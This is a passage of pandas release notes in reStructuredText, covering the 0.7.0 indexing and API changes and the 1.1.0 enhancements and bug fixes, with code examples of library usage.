-0.731920  -0.403130\n   std     0.730951   0.813266   1.112016   0.961912\n   min    -0.861849  -2.104569  -1.776904  -1.469388\n   25%    -0.411391  -0.698728  -1.501401  -1.076610\n   50%     0.380863  -0.228039  -1.191943  -1.004091\n   75%     0.658444   0.057974  -0.034326   0.461706\n   max     1.212112   0.577046   1.643563   1.071804\n\n   [8 rows x 4 columns]\n\n- :ref:`Add<advanced.reorderlevels>` ``reorder_levels`` method to Series and\n  DataFrame (:issue:`534`)\n\n- :ref:`Add<indexing.dictionarylike>` dict-like ``get`` function to DataFrame\n  and Panel (:issue:`521`)\n\n- :ref:`Add<basics.iterrows>` ``DataFrame.iterrows`` method for efficiently\n  iterating through the rows of a DataFrame\n\n- Add ``DataFrame.to_panel`` with code adapted from\n  ``LongPanel.to_long``\n\n- :ref:`Add <basics.reindexing>` ``reindex_axis`` method added to DataFrame\n\n- :ref:`Add <basics.stats>` ``level`` option to binary arithmetic functions on\n  ``DataFrame`` and ``Series``\n\n- :ref:`Add <advanced.advanced_reindex>` ``level`` option to the ``reindex``\n  and ``align`` methods on Series and DataFrame for broadcasting values across\n  a level (:issue:`542`, :issue:`552`, others)\n\n- Add attribute-based item access to\n  ``Panel`` and add IPython completion (:issue:`563`)\n\n- :ref:`Add <visualization.basic>` ``logy`` option to ``Series.plot`` for\n  log-scaling on the Y axis\n\n- :ref:`Add <io.formatting>` ``index`` and ``header`` options to\n  ``DataFrame.to_string``\n\n- :ref:`Can <merging.multiple_join>` pass multiple DataFrames to\n  ``DataFrame.join`` to join on index (:issue:`115`)\n\n- :ref:`Can <merging.multiple_join>` pass multiple Panels to ``Panel.join``\n  (:issue:`115`)\n\n- :ref:`Added <io.formatting>` ``justify`` argument to ``DataFrame.to_string``\n  to allow different alignment of column headers\n\n- :ref:`Add <groupby.attributes>` ``sort`` option to GroupBy to allow disabling\n  sorting of the group keys for potential speedups (:issue:`595`)\n\n- :ref:`Can <basics.dataframe.from_series>` pass MaskedArray to Series\n  constructor (:issue:`563`)\n\n- Add Panel item access via attributes\n  and IPython completion (:issue:`554`)\n\n- Implement ``DataFrame.lookup``, fancy-indexing analogue for retrieving values\n  given a sequence of row and column labels (:issue:`338`)\n\n- Can pass a :ref:`list of functions <groupby.aggregate.multifunc>` to\n  aggregate with groupby on a DataFrame, yielding an aggregated result with\n  hierarchical columns (:issue:`166`)\n\n- Can call ``cummin`` and ``cummax`` on Series and DataFrame to get cumulative\n  minimum and maximum, respectively (:issue:`647`)\n\n- ``value_range`` added as utility function to get min and max of a dataframe\n  (:issue:`288`)\n\n- Added ``encoding`` argument to ``read_csv``, ``read_table``, ``to_csv`` and\n  ``from_csv`` for non-ascii text (:issue:`717`)\n\n- :ref:`Added <basics.stats>` ``abs`` method to pandas objects\n\n- :ref:`Added <reshaping.pivot>` ``crosstab`` function for easily computing frequency tables\n\n- :ref:`Added <indexing.set_ops>` ``isin`` method to index objects\n\n- :ref:`Added <advanced.xs>` ``level`` argument to ``xs`` method of DataFrame.\n\n\nAPI changes to integer indexing\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nOne of the potentially riskiest API changes in 0.7.0, but also one of the most\nimportant, was a complete review of how **integer indexes** are handled with\nregard to label-based indexing. Here is an example:\n\n.. code-block:: ipython\n\n    In [3]: s = pd.Series(np.random.randn(10), index=range(0, 20, 2))\n    In [4]: s\n    Out[4]:\n    0    -1.294524\n    2     0.413738\n    4     0.276662\n    6    -0.472035\n    8    -0.013960\n    10   -0.362543\n    12   -0.006154\n    14   -0.923061\n    16    0.895717\n    18    0.805244\n    Length: 10, dtype: float64\n\n    In [5]: s[0]\n    Out[5]: -1.2945235902555294\n\n    In [6]: s[2]\n    Out[6]: 0.41373810535784006\n\n    In [7]: s[4]\n    Out[7]: 0.2766617129497566\n\nThis is all exactly identical to the behavior before. However, if you ask for a\nkey **not** contained in the Series, in versions 0.6.1 and prior, Series would\n*fall back* on a location-based lookup. This now raises a ``KeyError``:\n\n.. code-block:: ipython\n\n   In [2]: s[1]\n   KeyError: 1\n\nThis change also has the same impact on DataFrame:\n\n.. code-block:: ipython\n\n   In [3]: df = pd.DataFrame(np.random.randn(8, 4), index=range(0, 16, 2))\n\n   In [4]: df\n       0        1       2       3\n   0   0.88427  0.3363 -0.1787  0.03162\n   2   0.14451 -0.1415  0.2504  0.58374\n   4  -1.44779 -0.9186 -1.4996  0.27163\n   6  -0.26598 -2.4184 -0.2658  0.11503\n   8  -0.58776  0.3144 -0.8566  0.61941\n   10  0.10940 -0.7175 -1.0108  0.47990\n   12 -1.16919 -0.3087 -0.6049 -0.43544\n   14 -0.07337  0.3410  0.0424 -0.16037\n\n   In [5]: df.ix[3]\n   KeyError: 3\n\nIn order to support purely integer-based indexing, the following methods have\nbeen added:\n\n.. csv-table::\n    :header: \"Method\",\"Description\"\n    :widths: 40,60\n\n        ``Series.iget_value(i)``, Retrieve value stored at location ``i``\n        ``Series.iget(i)``, Alias for ``iget_value``\n        ``DataFrame.irow(i)``, Retrieve the ``i``-th row\n        ``DataFrame.icol(j)``, Retrieve the ``j``-th column\n        \"``DataFrame.iget_value(i, j)``\", Retrieve the value at row ``i`` and column ``j``\n\nAPI tweaks regarding label-based slicing\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nLabel-based slicing using ``ix`` now requires that the index be sorted\n(monotonic) **unless** both the start and endpoint are contained in the index:\n\n.. code-block:: python\n\n   In [1]: s = pd.Series(np.random.randn(6), index=list('gmkaec'))\n\n   In [2]: s\n   Out[2]:\n   g   -1.182230\n   m   -0.276183\n   k   -0.243550\n   a    1.628992\n   e    0.073308\n   c   -0.539890\n   dtype: float64\n\nThen this is OK:\n\n.. code-block:: python\n\n   In [3]: s.ix['k':'e']\n   Out[3]:\n   k   -0.243550\n   a    1.628992\n   e    0.073308\n   dtype: float64\n\nBut this is not:\n\n.. code-block:: ipython\n\n   In [12]: s.ix['b':'h']\n   KeyError 'b'\n\nIf the index had been sorted, the \"range selection\" would have been possible:\n\n.. code-block:: python\n\n   In [4]: s2 = s.sort_index()\n\n   In [5]: s2\n   Out[5]:\n   a    1.628992\n   c   -0.539890\n   e    0.073308\n   g   -1.182230\n   k   -0.243550\n   m   -0.276183\n   dtype: float64\n\n   In [6]: s2.ix['b':'h']\n   Out[6]:\n   c   -0.539890\n   e    0.073308\n   g   -1.182230\n   dtype: float64\n\nChanges to Series ``[]`` operator\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAs as notational convenience, you can pass a sequence of labels or a label\nslice to a Series when getting and setting values via ``[]`` (i.e. the\n``__getitem__`` and ``__setitem__`` methods). The behavior will be the same as\npassing similar input to ``ix`` **except in the case of integer indexing**:\n\n.. code-block:: ipython\n\n  In [8]: s = pd.Series(np.random.randn(6), index=list('acegkm'))\n\n  In [9]: s\n  Out[9]:\n  a   -1.206412\n  c    2.565646\n  e    1.431256\n  g    1.340309\n  k   -1.170299\n  m   -0.226169\n  Length: 6, dtype: float64\n\n  In [10]: s[['m', 'a', 'c', 'e']]\n  Out[10]:\n  m   -0.226169\n  a   -1.206412\n  c    2.565646\n  e    1.431256\n  Length: 4, dtype: float64\n\n  In [11]: s['b':'l']\n  Out[11]:\n  c    2.565646\n  e    1.431256\n  g    1.340309\n  k   -1.170299\n  Length: 4, dtype: float64\n\n  In [12]: s['c':'k']\n  Out[12]:\n  c    2.565646\n  e    1.431256\n  g    1.340309\n  k   -1.170299\n  Length: 4, dtype: float64\n\nIn the case of integer indexes, the behavior will be exactly as before\n(shadowing ``ndarray``):\n\n.. code-block:: ipython\n\n  In [13]: s = pd.Series(np.random.randn(6), index=range(0, 12, 2))\n\n  In [14]: s[[4, 0, 2]]\n  Out[14]:\n  4    0.132003\n  0    0.410835\n  2    0.813850\n  Length: 3, dtype: float64\n\n  In [15]: s[1:5]\n  Out[15]:\n  2    0.813850\n  4    0.132003\n  6   -0.827317\n  8   -0.076467\n  Length: 4, dtype: float64\n\nIf you wish to do indexing with sequences and slicing on an integer index with\nlabel semantics, use ``ix``.\n\nOther API changes\n~~~~~~~~~~~~~~~~~\n\n- The deprecated ``LongPanel`` class has been completely removed\n\n- If ``Series.sort`` is called on a column of a DataFrame, an exception will\n  now be raised. Before it was possible to accidentally mutate a DataFrame's\n  column by doing ``df[col].sort()`` instead of the side-effect free method\n  ``df[col].order()`` (:issue:`316`)\n\n- Miscellaneous renames and deprecations which will (harmlessly) raise\n  ``FutureWarning``\n\n- ``drop`` added as an optional parameter to ``DataFrame.reset_index`` (:issue:`699`)\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- :ref:`Cythonized GroupBy aggregations <groupby.aggregate.builtin>` no longer\n  presort the data, thus achieving a significant speedup (:issue:`93`).  GroupBy\n  aggregations with Python functions significantly sped up by clever\n  manipulation of the ndarray data type in Cython (:issue:`496`).\n- Better error message in DataFrame constructor when passed column labels\n  don't match data (:issue:`497`)\n- Substantially improve performance of multi-GroupBy aggregation when a\n  Python function is passed, reuse ndarray object in Cython (:issue:`496`)\n- Can store objects indexed by tuples and floats in HDFStore (:issue:`492`)\n- Don't print length by default in Series.to_string, add ``length`` option (:issue:`489`)\n- Improve Cython code for multi-groupby to aggregate without having to sort\n  the data (:issue:`93`)\n- Improve MultiIndex reindexing speed by storing tuples in the MultiIndex,\n  test for backwards unpickling compatibility\n- Improve column reindexing performance by using specialized Cython take\n  function\n- Further performance tweaking of Series.__getitem__ for standard use cases\n- Avoid Index dict creation in some cases (i.e. when getting slices, etc.),\n  regression from prior versions\n- Friendlier error message in setup.py if NumPy not installed\n- Use common set of NA-handling operations (sum, mean, etc.) in Panel class\n  also (:issue:`536`)\n- Default name assignment when calling ``reset_index`` on DataFrame with a\n  regular (non-hierarchical) index (:issue:`476`)\n- Use Cythonized groupers when possible in Series/DataFrame stat ops with\n  ``level`` parameter passed (:issue:`545`)\n- Ported skiplist data structure to C to speed up ``rolling_median`` by about\n  5-10x in most typical use cases (:issue:`374`)\n\n\n.. _whatsnew_0.7.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.6.1..v0.7.0\n", "1.1.0": ".. _whatsnew_110:\n\nWhat's new in 1.1.0 (July 28, 2020)\n-----------------------------------\n\nThese are the changes in pandas 1.1.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_110.specify_missing_labels:\n\nKeyErrors raised by loc specify missing labels\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nPreviously, if labels were missing for a ``.loc`` call, a KeyError was raised stating that this was no longer supported.\n\nNow the error message also includes a list of the missing labels (max 10 items, display width 80 characters). See :issue:`34272`.\n\n\n.. _whatsnew_110.astype_string:\n\nAll dtypes can now be converted to ``StringDtype``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, declaring or converting to :class:`StringDtype` was in general only possible if the data was already only ``str`` or nan-like (:issue:`31204`).\n:class:`StringDtype` now works in all situations where ``astype(str)`` or ``dtype=str`` work:\n\nFor example, the below now works:\n\n.. ipython:: python\n\n   ser = pd.Series([1, \"abc\", np.nan], dtype=\"string\")\n   ser\n   ser[0]\n   pd.Series([1, 2, np.nan], dtype=\"Int64\").astype(\"string\")\n\n\n.. _whatsnew_110.period_index_partial_string_slicing:\n\nNon-monotonic PeriodIndex partial string slicing\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`PeriodIndex` now supports partial string slicing for non-monotonic indexes, mirroring :class:`DatetimeIndex` behavior (:issue:`31096`)\n\nFor example:\n\n.. ipython:: python\n\n   dti = pd.date_range(\"2014-01-01\", periods=30, freq=\"30D\")\n   pi = dti.to_period(\"D\")\n   ser_monotonic = pd.Series(np.arange(30), index=pi)\n   shuffler = list(range(0, 30, 2)) + list(range(1, 31, 2))\n   ser = ser_monotonic.iloc[shuffler]\n   ser\n\n.. ipython:: python\n\n   ser[\"2014\"]\n   ser.loc[\"May 2015\"]\n\n\n.. _whatsnew_110.dataframe_or_series_comparing:\n\nComparing two ``DataFrame`` or two ``Series`` and summarizing the differences\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWe've added :meth:`DataFrame.compare` and :meth:`Series.compare` for comparing two ``DataFrame`` or two ``Series`` (:issue:`30429`)\n\n.. ipython:: python\n\n   df = pd.DataFrame(\n       {\n           \"col1\": [\"a\", \"a\", \"b\", \"b\", \"a\"],\n           \"col2\": [1.0, 2.0, 3.0, np.nan, 5.0],\n           \"col3\": [1.0, 2.0, 3.0, 4.0, 5.0]\n       },\n       columns=[\"col1\", \"col2\", \"col3\"],\n   )\n   df\n\n.. ipython:: python\n\n   df2 = df.copy()\n   df2.loc[0, 'col1'] = 'c'\n   df2.loc[2, 'col3'] = 4.0\n   df2\n\n.. ipython:: python\n\n   df.compare(df2)\n\nSee :ref:`User Guide <merging.compare>` for more details.\n\n\n.. _whatsnew_110.groupby_key:\n\nAllow NA in groupby key\n^^^^^^^^^^^^^^^^^^^^^^^^\n\nWith :ref:`groupby <groupby.dropna>` , we've added a ``dropna`` keyword to :meth:`DataFrame.groupby` and :meth:`Series.groupby` in order to\nallow ``NA`` values in group keys. Users can define ``dropna`` to ``False`` if they want to include\n``NA`` values in groupby keys. The default is set to ``True`` for ``dropna`` to keep backwards\ncompatibility (:issue:`3729`)\n\n.. ipython:: python\n\n    df_list = [[1, 2, 3], [1, None, 4], [2, 1, 3], [1, 2, 2]]\n    df_dropna = pd.DataFrame(df_list, columns=[\"a\", \"b\", \"c\"])\n\n    df_dropna\n\n.. ipython:: python\n\n    # Default ``dropna`` is set to True, which will exclude NaNs in keys\n    df_dropna.groupby(by=[\"b\"], dropna=True).sum()\n\n    # In order to allow NaN in keys, set ``dropna`` to False\n    df_dropna.groupby(by=[\"b\"], dropna=False).sum()\n\nThe default setting of ``dropna`` argument is ``True`` which means ``NA`` are not included in group keys.\n\n\n.. _whatsnew_110.key_sorting:\n\nSorting with keys\n^^^^^^^^^^^^^^^^^\n\nWe've added a ``key`` argument to the :class:`DataFrame` and :class:`Series` sorting methods, including\n:meth:`DataFrame.sort_values`, :meth:`DataFrame.sort_index`, :meth:`Series.sort_values`,\nand :meth:`Series.sort_index`. The ``key`` can be any callable function which is applied\ncolumn-by-column to each column used for sorting, before sorting is performed (:issue:`27237`).\nSee :ref:`sort_values with keys <basics.sort_value_key>` and :ref:`sort_index with keys\n<basics.sort_index_key>` for more information.\n\n.. ipython:: python\n\n   s = pd.Series(['C', 'a', 'B'])\n   s\n\n.. ipython:: python\n\n   s.sort_values()\n\n\nNote how this is sorted with capital letters first. If we apply the :meth:`Series.str.lower`\nmethod, we get\n\n.. ipython:: python\n\n   s.sort_values(key=lambda x: x.str.lower())\n\n\nWhen applied to a ``DataFrame``, they key is applied per-column to all columns or a subset if\n``by`` is specified, e.g.\n\n.. ipython:: python\n\n   df = pd.DataFrame({'a': ['C', 'C', 'a', 'a', 'B', 'B'],\n                      'b': [1, 2, 3, 4, 5, 6]})\n   df\n\n.. ipython:: python\n\n   df.sort_values(by=['a'], key=lambda col: col.str.lower())\n\n\nFor more details, see examples and documentation in :meth:`DataFrame.sort_values`,\n:meth:`Series.sort_values`, and :meth:`~DataFrame.sort_index`.\n\n.. _whatsnew_110.timestamp_fold_support:\n\nFold argument support in Timestamp constructor\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`Timestamp:` now supports the keyword-only fold argument according to `PEP 495 <https://www.python.org/dev/peps/pep-0495/#the-fold-attribute>`_ similar to parent ``datetime.datetime`` class. It supports both accepting fold as an initialization argument and inferring fold from other constructor arguments (:issue:`25057`, :issue:`31338`). Support is limited to ``dateutil`` timezones as ``pytz`` doesn't support fold.\n\nFor example:\n\n.. ipython:: python\n\n    ts = pd.Timestamp(\"2019-10-27 01:30:00+00:00\")\n    ts.fold\n\n.. ipython:: python\n\n    ts = pd.Timestamp(year=2019, month=10, day=27, hour=1, minute=30,\n                      tz=\"dateutil/Europe/London\", fold=1)\n    ts\n\nFor more on working with fold, see :ref:`Fold subsection <timeseries.fold>` in the user guide.\n\n.. _whatsnew_110.to_datetime_multiple_tzname_tzoffset_support:\n\nParsing timezone-aware format with different timezones in to_datetime\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`to_datetime` now supports parsing formats containing timezone names (``%Z``) and UTC offsets (``%z``) from different timezones then converting them to UTC by setting ``utc=True``. This would return a :class:`DatetimeIndex` with timezone at UTC as opposed to an :class:`Index` with ``object`` dtype if ``utc=True`` is not set (:issue:`32792`).\n\nFor example:\n\n.. ipython:: python\n\n    tz_strs = [\"2010-01-01 12:00:00 +0100\", \"2010-01-01 12:00:00 -0100\",\n               \"2010-01-01 12:00:00 +0300\", \"2010-01-01 12:00:00 +0400\"]\n    pd.to_datetime(tz_strs, format='%Y-%m-%d %H:%M:%S %z', utc=True)\n\n.. code-block:: ipython\n\n   In[37]: pd.to_datetime(tz_strs, format='%Y-%m-%d %H:%M:%S %z')\n   Out[37]:\n   Index([2010-01-01 12:00:00+01:00, 2010-01-01 12:00:00-01:00,\n          2010-01-01 12:00:00+03:00, 2010-01-01 12:00:00+04:00],\n         dtype='object')\n\n.. _whatsnew_110.grouper_resample_origin:\n\nGrouper and resample now supports the arguments origin and offset\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`Grouper` and :meth:`DataFrame.resample` now supports the arguments ``origin`` and ``offset``. It let the user control the timestamp on which to adjust the grouping. (:issue:`31809`)\n\nThe bins of the grouping are adjusted based on the beginning of the day of the time series starting point. This works well with frequencies that are multiples of a day (like ``30D``) or that divides a day (like ``90s`` or ``1min``). But it can create inconsistencies with some frequencies that do not meet this criteria. To change this behavior you can now specify a fixed timestamp with the argument ``origin``.\n\nTwo arguments are now deprecated (more information in the documentation of :meth:`DataFrame.resample`):\n\n- ``base`` should be replaced by ``offset``.\n- ``loffset`` should be replaced by directly adding an offset to the index :class:`DataFrame` after being resampled.\n\nSmall example of the use of ``origin``:\n\n.. ipython:: python\n\n    start, end = '2000-10-01 23:30:00', '2000-10-02 00:30:00'\n    middle = '2000-10-02 00:00:00'\n    rng = pd.date_range(start, end, freq='7min')\n    ts = pd.Series(np.arange(len(rng)) * 3, index=rng)\n    ts\n\nResample with the default behavior ``'start_day'`` (origin is ``2000-10-01 00:00:00``):\n\n.. ipython:: python\n\n    ts.resample('17min').sum()\n    ts.resample('17min', origin='start_day').sum()\n\nResample using a fixed origin:\n\n.. ipython:: python\n\n    ts.resample('17min', origin='epoch').sum()\n    ts.resample('17min', origin='2000-01-01').sum()\n\nIf needed you can adjust the bins with the argument ``offset`` (a :class:`Timedelta`) that would be added to the default ``origin``.\n\nFor a full example, see: :ref:`timeseries.adjust-the-start-of-the-bins`.\n\nfsspec now used for filesystem handling\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nFor reading and writing to filesystems other than local and reading from HTTP(S),\nthe optional dependency ``fsspec`` will be used to dispatch operations (:issue:`33452`).\nThis will give unchanged\nfunctionality for S3 and GCS storage, which were already supported, but also add\nsupport for several other storage implementations such as `Azure Datalake and Blob`_,\nSSH, FTP, dropbox and github. For docs and capabilities, see the `fsspec docs`_.\n\nThe existing capability to interface with S3 and GCS will be unaffected by this\nchange, as ``fsspec`` will still bring in the same packages as before.\n\n.. _Azure Datalake and Blob: https://github.com/fsspec/adlfs\n\n.. _fsspec docs: https://filesystem-spec.readthedocs.io/en/latest/\n\n.. _whatsnew_110.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- Compatibility with matplotlib 3.3.0 (:issue:`34850`)\n- :meth:`IntegerArray.astype` now supports ``datetime64`` dtype (:issue:`32538`)\n- :class:`IntegerArray` now implements the ``sum`` operation (:issue:`33172`)\n- Added :class:`pandas.errors.InvalidIndexError` (:issue:`34570`).\n- Added :meth:`DataFrame.value_counts` (:issue:`5377`)\n- Added a :func:`pandas.api.indexers.FixedForwardWindowIndexer` class to support forward-looking windows during ``rolling`` operations.\n- Added a :func:`pandas.api.indexers.VariableOffsetWindowIndexer` class to support ``rolling`` operations with non-fixed offsets (:issue:`34994`)\n- :meth:`~DataFrame.describe` now includes a ``datetime_is_numeric`` keyword to control how datetime columns are summarized (:issue:`30164`, :issue:`34798`)\n- :class:`~pandas.io.formats.style.Styler` may now render CSS more efficiently where multiple cells have the same styling (:issue:`30876`)\n- :meth:`~pandas.io.formats.style.Styler.highlight_null` now accepts ``subset`` argument (:issue:`31345`)\n- When writing directly to a sqlite connection :meth:`DataFrame.to_sql` now supports the ``multi`` method (:issue:`29921`)\n- :class:`pandas.errors.OptionError` is now exposed in ``pandas.errors`` (:issue:`27553`)\n- Added :meth:`api.extensions.ExtensionArray.argmax` and :meth:`api.extensions.ExtensionArray.argmin` (:issue:`24382`)\n- :func:`timedelta_range` will now infer a frequency when passed ``start``, ``stop``, and ``periods`` (:issue:`32377`)\n- Positional slicing on a :class:`IntervalIndex` now supports slices with ``step > 1`` (:issue:`31658`)\n- :class:`Series.str` now has a ``fullmatch`` method that matches a regular expression against the entire string in each row of the :class:`Series`, similar to ``re.fullmatch`` (:issue:`32806`).\n- :meth:`DataFrame.sample` will now also allow array-like and BitGenerator objects to be passed to ``random_state`` as seeds (:issue:`32503`)\n- :meth:`Index.union` will now raise ``RuntimeWarning`` for :class:`MultiIndex` objects if the object inside are unsortable. Pass ``sort=False`` to suppress this warning (:issue:`33015`)\n- Added :meth:`Series.dt.isocalendar` and :meth:`DatetimeIndex.isocalendar` that returns a :class:`DataFrame` with year, week, and day calculated according to the ISO 8601 calendar (:issue:`33206`, :issue:`34392`).\n- The :meth:`DataFrame.to_feather` method now supports additional keyword\n  arguments (e.g. to set the compression) that are added in pyarrow 0.17\n  (:issue:`33422`).\n- The :func:`cut` will now accept parameter ``ordered`` with default ``ordered=True``. If ``ordered=False`` and no labels are provided, an error will be raised (:issue:`33141`)\n- :meth:`DataFrame.to_csv`, :meth:`DataFrame.to_pickle`,\n  and :meth:`DataFrame.to_json` now support passing a dict of\n  compression arguments when using the ``gzip`` and ``bz2`` protocols.\n  This can be used to set a custom compression level, e.g.,\n  ``df.to_csv(path, compression={'method': 'gzip', 'compresslevel': 1}``\n  (:issue:`33196`)\n- :meth:`melt` has gained an ``ignore_index`` (default ``True``) argument that, if set to ``False``, prevents the method from dropping the index (:issue:`17440`).\n- :meth:`Series.update` now accepts objects that can be coerced to a :class:`Series`,\n  such as ``dict`` and ``list``, mirroring the behavior of :meth:`DataFrame.update` (:issue:`33215`)\n- :meth:`.DataFrameGroupBy.transform` and :meth:`.DataFrameGroupBy.aggregate` have gained ``engine`` and ``engine_kwargs`` arguments that support executing functions with ``Numba`` (:issue:`32854`, :issue:`33388`)\n- :meth:`.Resampler.interpolate` now supports SciPy interpolation method :class:`scipy.interpolate.CubicSpline` as method ``cubicspline`` (:issue:`33670`)\n- :class:`.DataFrameGroupBy` and :class:`.SeriesGroupBy` now implement the ``sample`` method for doing random sampling within groups (:issue:`31775`)\n- :meth:`DataFrame.to_numpy` now supports the ``na_value`` keyword to control the NA sentinel in the output array (:issue:`33820`)\n- Added :class:`api.extension.ExtensionArray.equals` to the extension array interface, similar to :meth:`Series.equals` (:issue:`27081`)\n- The minimum supported dta version has increased to 105 in :func:`read_stata` and :class:`~pandas.io.stata.StataReader`  (:issue:`26667`).\n- :meth:`~DataFrame.to_stata` supports compression using the ``compression``\n  keyword argument. Compression can either be inferred or explicitly set using a string or a\n  dictionary containing both the method and any additional arguments that are passed to the\n  compression library. Compression was also added to the low-level Stata-file writers\n  :class:`~pandas.io.stata.StataWriter`, :class:`~pandas.io.stata.StataWriter117`,\n  and :class:`~pandas.io.stata.StataWriterUTF8` (:issue:`26599`).\n- :meth:`HDFStore.put` now accepts a ``track_times`` parameter. This parameter is passed to the ``create_table`` method of ``PyTables`` (:issue:`32682`).\n- :meth:`Series.plot` and :meth:`DataFrame.plot` now accepts ``xlabel`` and ``ylabel`` parameters to present labels on x and y axis (:issue:`9093`).\n- Made :class:`.Rolling` and :class:`.Expanding` iterable\u00ef\u00bc\u0088:issue:`11704`)\n- Made ``option_context`` a :class:`contextlib.ContextDecorator`, which allows it to be used as a decorator over an entire function (:issue:`34253`).\n- :meth:`DataFrame.to_csv` and :meth:`Series.to_csv` now accept an ``errors`` argument (:issue:`22610`)\n- :meth:`.DataFrameGroupBy.groupby.transform` now allows ``func`` to be ``pad``, ``backfill`` and ``cumcount`` (:issue:`31269`).\n- :func:`read_json` now accepts an ``nrows`` parameter. (:issue:`33916`).\n- :meth:`DataFrame.hist`, :meth:`Series.hist`, :meth:`core.groupby.DataFrameGroupBy.hist`, and :meth:`core.groupby.SeriesGroupBy.hist` have gained the ``legend`` argument. Set to True to show a legend in the histogram. (:issue:`6279`)\n- :func:`concat` and :meth:`~DataFrame.append` now preserve extension dtypes, for example\n  combining a nullable integer column with a numpy integer column will no longer\n  result in object dtype but preserve the integer dtype (:issue:`33607`, :issue:`34339`, :issue:`34095`).\n- :func:`read_gbq` now allows to disable progress bar (:issue:`33360`).\n- :func:`read_gbq` now supports the ``max_results`` kwarg from ``pandas-gbq`` (:issue:`34639`).\n- :meth:`DataFrame.cov` and :meth:`Series.cov` now support a new parameter ``ddof`` to support delta degrees of freedom as in the corresponding numpy methods (:issue:`34611`).\n- :meth:`DataFrame.to_html` and :meth:`DataFrame.to_string`'s ``col_space`` parameter now accepts a list or dict to change only some specific columns' width (:issue:`28917`).\n- :meth:`DataFrame.to_excel` can now also write OpenOffice spreadsheet (.ods) files (:issue:`27222`)\n- :meth:`~Series.explode` now accepts ``ignore_index`` to reset the index, similar to :meth:`pd.concat` or :meth:`DataFrame.sort_values` (:issue:`34932`).\n- :meth:`DataFrame.to_markdown` and :meth:`Series.to_markdown` now accept ``index`` argument as an alias for tabulate's ``showindex`` (:issue:`32667`)\n- :meth:`read_csv` now accepts string values like \"0\", \"0.0\", \"1\", \"1.0\" as convertible to the nullable Boolean dtype (:issue:`34859`)\n- :class:`.ExponentialMovingWindow` now supports a ``times`` argument that allows ``mean`` to be calculated with observations spaced by the timestamps in ``times`` (:issue:`34839`)\n- :meth:`DataFrame.agg` and :meth:`Series.agg` now accept named aggregation for renaming the output columns/indexes. (:issue:`26513`)\n- ``compute.use_numba`` now exists as a configuration option that utilizes the numba engine when available (:issue:`33966`, :issue:`35374`)\n- :meth:`Series.plot` now supports asymmetric error bars. Previously, if :meth:`Series.plot` received a \"2xN\" array with error values for ``yerr`` and/or ``xerr``, the left/lower values (first row) were mirrored, while the right/upper values (second row) were ignored. Now, the first row represents the left/lower error values and the second row the right/upper error values. (:issue:`9536`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_110.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n``MultiIndex.get_indexer`` interprets ``method`` argument correctly\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThis restores the behavior of :meth:`MultiIndex.get_indexer` with ``method='backfill'`` or ``method='pad'`` to the behavior before pandas 0.23.0. In particular, MultiIndexes are treated as a list of tuples and padding or backfilling is done with respect to the ordering of these lists of tuples (:issue:`29896`).\n\nAs an example of this, given:\n\n.. ipython:: python\n\n        df = pd.DataFrame({\n            'a': [0, 0, 0, 0],\n            'b': [0, 2, 3, 4],\n            'c': ['A', 'B', 'C', 'D'],\n        }).set_index(['a', 'b'])\n        mi_2 = pd.MultiIndex.from_product([[0], [-1, 0, 1, 3, 4, 5]])\n\nThe differences in reindexing ``df`` with ``mi_2`` and using ``method='backfill'`` can be seen here:\n\n*pandas >= 0.23, < 1.1.0*:\n\n.. code-block:: ipython\n\n    In [1]: df.reindex(mi_2, method='backfill')\n    Out[1]:\n          c\n    0 -1  A\n       0  A\n       1  D\n       3  A\n       4  A\n       5  C\n\n*pandas <0.23, >= 1.1.0*\n\n.. ipython:: python\n\n        df.reindex(mi_2, method='backfill')\n\nAnd the differences in reindexing ``df`` with ``mi_2`` and using ``method='pad'`` can be seen here:\n\n*pandas >= 0.23, < 1.1.0*\n\n.. code-block:: ipython\n\n    In [1]: df.reindex(mi_2, method='pad')\n    Out[1]:\n            c\n    0 -1  NaN\n       0  NaN\n       1    D\n       3  NaN\n       4    A\n       5    C\n\n*pandas < 0.23, >= 1.1.0*\n\n.. ipython:: python\n\n        df.reindex(mi_2, method='pad')\n\n.. _whatsnew_110.notable_bug_fixes.indexing_raises_key_errors:\n\nFailed label-based lookups always raise KeyError\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nLabel lookups ``series[key]``, ``series.loc[key]`` and ``frame.loc[key]``\nused to raise either ``KeyError`` or ``TypeError`` depending on the type of\nkey and type of :class:`Index`.  These now consistently raise ``KeyError`` (:issue:`31867`)\n\n.. ipython:: python\n\n    ser1 = pd.Series(range(3), index=[0, 1, 2])\n    ser2 = pd.Series(range(3), index=pd.date_range(\"2020-02-01\", periods=3))\n\n*Previous behavior*:\n\n.. code-block:: 